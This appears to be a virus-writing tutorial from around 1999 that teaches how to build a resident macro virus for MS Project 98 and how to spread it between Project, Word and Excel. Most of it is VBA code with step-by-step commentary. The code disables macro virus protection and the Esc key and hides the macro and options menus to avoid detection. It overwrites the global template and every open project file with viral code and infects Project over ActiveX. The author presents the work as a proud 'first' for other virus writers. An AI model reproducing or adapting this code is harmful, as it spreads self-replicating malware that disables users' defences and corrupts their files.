<P> <b>Introduction</b></P>
<P> On Oct 26,1999 Data Fellows first reported the birth of a new infection platform. 
  Someone wrote a piece of code that was able to infect the MS Project application. 
  Corner, it's name, is a cross application macro between Word97/2K and Project98. 
  The only information about this virus is taken from Data Fellows virus information 
  page. I wanted to give you the source here, but it seems that only the AV community 
  has the source. If someone has it, please mail it to me! Accourding to Data 
  Fellow virus description, Corner (original name in virus code is 'Closer') infects 
  Word in the common way, and is not resident in the template of Project98. It 
  adds a blank project file and infects it. I think that all cross infection is 
  done with ActiveX communication between the two applications. </P>
<P> <b>MS Project</b></P>
<P>
What is MS Project? MS Project is accourding the manual an easy to
handle and powerful project tool. I only have an evaluation version
especially for this tutorial. Like any other Office application, MS
Project does have the build in macro language VBA. So if you are a 
macro coder, you will find your way very very soon. MS Project does
also have a global template like in Word, but it is not so easy to
access this template, but after a few hours starring at the screen,
I found a way to infect it. ;)
</P>
<P> So first let us take a look on the infection hooks that are available or with 
  any sense for us: </P>
<blockquote>
  <pre>Project_Activate </pre>
</blockquote>
<P>     
     Whenever our infected project book gets activated, due change 
     of windows, or opening, whatever.
</P>
<blockquote>
  <pre>Project_Deactivate </pre>
</blockquote>
<P>
     This hook gets active when our infected project book is the
     active one and a new one gets opened, or selected, whatever.
</P>
<pre>    Project_Close </pre>
<P>
     Like the name says, when our project book gets closed, this
     hook does it's work.
</P>
<pre>    Project_Open </pre>
<P>
     The same as close but only on opening a project book.
</P><P>
In my opinion Project_Close and Project_Open are the main hooks for
writing a project macro, but use as you like.
</P><P>
So now let us look at a common infection sceme:

</P>
<ol>
  <ol>
    <li> Change some options like virus protection etc. </li>
    <li>Check if we are in global template </li>
    <li>If not, infect it </li>
    <li>Check if we are in all opened project books </li>
    <li>If not, infect them all </li>
  </ol>
</ol>
<P> <b>Changing some options</b></P>
<P>
Due MS Project is part of Office package, the common commands of 
setting options is nearly the same. Use the following commands:
</P><PRE>
    Application.EnableCancelKey = pjDisabled
</PRE><P>
Disables the ESC key while executing a macro.
</P><PRE>
    Application.DisplayAlerts = False
</PRE><P>
To stop the displaying of errors.
</P><PRE>
    Application.MacroVirusProtection = False
</PRE><P>
To disable the macro virus protection. ;)
</P><PRE>
    Application.DisplayStatusBar = False
</PRE><P>
To hide the status bar at the bottom of the window, that our user
doesn't see when the book is saved or whatever.
</P><PRE>
    CommandBars("Tools").Controls(9).Enabled = False
    CommandBars("Tools").Controls(12).Enabled = False
</PRE><P>
Use this to have a bit of basic stealth for your Project macro bug.
It disables Tools/Macro and Tools/Options.
</P>
<P> <b>Checking and Infecting template</b></P>
<P>
As I got this application and heard that the first macro of this
kind is not resisdent in the template, my main goal was to make it
resisdent. ;) So I took a seat, looked at the whole help file and 
found more sand in my pocket than help on how to access this global
template in this help file. After starring hours and hours into the
screen I got an idea and it worked! Due the cause that you can't
access this global template as easy as in Word, you have to use
some tricks.
</P><P>
So first I took a look at the project window of the Visual Basic
Editor, looked and looked, then some idea popped up in my mind:
'What if i access the project?' This idea worked out as you can see
below...
</P><PRE>
    With Application.VBE.VBProjects(1).VBComponents(1).CodeModule
</PRE>
<P> The first project is always the global template project, so we access this 
  to get access to the class object, 'ThisProject' of the global template. You 
  can also use 'ProjectGlobal' instead of the '1' in VBProjects for the case that 
  someone renames the VBA Project, which seems where unlikely. So it's a good 
  decision to use the '1'. </P>
<PRE>
      If .Lines(1, 1) &lt;&gt; "'Project" Then
</PRE><P>
Check if the first line isn't equal to our marker
</P><PRE>
          .DeleteLines 1, .CountOfLines
</PRE><P> 
Delete all lines if the marker isn't right
</P><PRE>
          .InsertLines 1, OurCode
</PRE><P>
Insert our viral code then
</P><PRE>
      End If
     End With
</PRE><P>
This works good. So here you have the code to make a resident macro
bug for MS Project but remember, I did it first...hehe.
</P>
<P> <b>Checking and infecting projects</b></P>
<P>
It is a good idea infecting all open project books at once. So there
are a few things you should look out for but I will explain them. 
It is a problem to save the infected book after infection, cause 
you can only save the active project file. So you need to activate
it before saving, otherwise all books will be saved under the same 
names.
</P><P>
To infect all open projects just do a simple 'for/next' loop:
</P><PRE>
    For x = 1 To Projects.Count
</PRE><P>
Create a loop from one to the number of all opened project files
</P><PRE>
     With Projects(x).VBProject.VBComponents(1).CodeModule
      If .Lines(1, 1) &lt;&gt; "'Project" Then
</PRE><P>
If the first line in the class object 'ThisProject' isn't equal to
our marker, then
</P><PRE>
          .DeleteLines 1, .CountOfLines
</PRE><P>
delete all lines in the class
</P><PRE>
          .InsertLines 1, OurCode
</PRE><P>
and insert our viral code there.
</P><PRE>
          Projects(x).Activate
</PRE><P>
Activate the current infected project file to prepare everything
for saving it.
</P><PRE>
          FileSaveAs Projects(x).FullName
</PRE><P>
Save the file under it's fullname.
</P><PRE>
      End If
    End With
   Next
</PRE><P>
Jump next file.
</P><P>
We need to activate the project file, that it is saved under the
right name. Otherwise all files will be saved under the name of the
activated project.
</P>
<P> <b>Cross application infection</b></P>
<P>
Well, cross infection. First I had no clue what the ActiveX class
name of MS Project would be, but after a short while I found it in
the windows registry. So if you want to use a MS Project as a cross
infection part, then you have to change the name of the sub routine
from 'Private Sub Project_Open(ByVal pj As MSProject.Project)' to 
'Private Sub Project_Open()' or whatever you like, in the other part
of the cross infection for example in Word or Excel the original
sub name 'Private Sub Project_Open(ByVal pj As MSProject.Project)'
will force an error, because ByVal is not definied but you have to
change it back if you infect MS Project from Word or Excel so that
our infection hook works correct. If you don't understand it here,
you will see what I mean if you write your own cross infector. So
I wrote this little piece of code here to infect MS Project from
another MS Office application:
</P><PRE>
 If Application.UserName &lt;&gt; "Empty" Then
</PRE><P>
I use this to prevent re-infection of MS Project everytime our
routine runs.
</P><PRE>
 Set CrossObj = GetObject(, "msproject.application")
</PRE><P>
Check if MS Project is open. As you see use 'MSProject.Application'
as the class for ActiveX communication.
</P><PRE>
 If CrossObj = "" Then _
    Set CrossObj = CreateObject("msproject.application"): _
    QuitUs = 1
</PRE><P>
If MS Project is not open, create a hidden communication and set
our marker if we have to quit the hidden started application.
</P><PRE>
 With CrossObj.Application.VBE.VBProjects(1).VBComponents(1).CodeModule
</PRE>
<P> The first project is always the global template project, so we access this 
  to get access to the class object, 'ThisProject' of the global template. </P>
<PRE>
     .DeleteLines 1, .CountOfLines
</PRE><P>
Delete all lines from the class object 
</P><PRE>
     .InsertLines 1, OurCode
</PRE><P>
Insert our virulant code
</P><PRE>
     Application.UserName = "Empty"
</PRE><P>
Set the user name to 'Empty' to prevent re-infection
</P><PRE>
 End With

 If QuitUs = 1 Then CrossObj.Quit
</PRE><P>
If we started a new application we have to quit it again.
</P><PRE>
 End If
</PRE>
<P> Well, this whole routine is taken from Empty which is an three application 
  cross infector written by me. Check latest zines for the code. </P>
<P> <b>Conclusion</b></P>
<P>
So three days after the birth of the first MS Project infector ever,
I am proud to present you the first resisdent MS Project only in-
fector. I am sure when I say that this may not be perfect, but I
just did it for my own couriosity (and to be the first..hehe). So
if someone has the original source of 'Corner' so please send it to
me! Also I would like to say thanks to Darkman who brought me to the
idea to write such a MS Project infector. This one is for you! Also
a big thanks to my man Zer0 how made all this possible, he gave me
the url to download my MS Project trial version! Thanks
</P><P>

<P align="center"> -!NEVER FORGET TO APPRECIATE THE WORK OF OTHER PEOPLE!- </P>
<P>
As a bonus, here the original source code of the second macro which
infects MS Project98, the first one which is resisdent in the global
template of MS Project98 and only infects Project files. ( *.MPP )
I could have added a polymorphic routine to change the variables,
but I only had two variables, so I thougt that it is not necessary
this time...look out Project98/Word97-2K/Excel97-2K.Empty for such
a thingie...;)
